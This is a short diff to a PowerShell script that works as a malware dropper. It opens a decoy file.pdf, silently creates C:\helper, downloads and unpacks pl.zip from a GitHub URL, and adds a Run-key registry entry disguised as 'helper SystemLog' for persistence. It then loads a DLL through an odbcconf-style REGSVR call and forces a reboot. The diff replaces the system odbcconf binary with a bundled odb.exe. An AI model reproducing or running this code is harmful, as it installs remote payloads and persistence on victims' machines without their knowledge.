@@ -2,12 +2,12 @@ echo 1 > file.pdf ;
 .\file.pdf ;
 if (Test-Path C:\helper\log3.dll) { exit } 
 else { 
-New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "helper SystemLog" -Value 'odbcconf /a {REGSVR C:\helper\log3.dll}' -Force ;
+New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "helper SystemLog" -Value 'C:\helper\odb.exe /a {REGSVR C:\helper\log3.dll}' -Force ;
 
 powershell -WindowStyle hidden New-Item -ItemType Directory -Force -Path 'C:\helper' | Out-Null ;
 wget "https://github.com/RQ3Xd/1/raw/refs/heads/main/pl.zip" -o C:\helper\pl.zip; start-sleep 3 ;
 Expand-Archive -Path "C:\helper\pl.zip" -DestinationPath "C:\helper\" -Force ;
 
-start-process odbcconf -Argument "REGSVR C:\helper\log3.dll" ;
+start-process C:\helper\odb.exe -Argument "REGSVR C:\helper\log3.dll" ;
 start-sleep 3600 ; shutdown /r /t 300;
 }
